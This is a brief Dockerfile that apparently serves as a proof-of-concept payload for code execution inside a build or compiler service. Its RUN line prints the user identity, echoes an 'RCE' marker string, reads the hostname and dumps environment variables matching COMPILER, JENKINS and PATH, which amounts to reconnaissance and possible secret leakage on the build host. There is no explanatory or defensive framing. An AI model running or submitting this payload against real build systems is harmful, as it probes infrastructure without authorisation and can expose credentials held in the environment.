FROM scratch
ADD rootfs.tar /
RUN /bin/sh -c 'id; echo FINAL_RCE_22063; cat /etc/hostname; whoami; env | grep -iE "COMPILER|JENKINS|PATH" | head -20'
ENTRYPOINT ["/bin/sh","-c"]
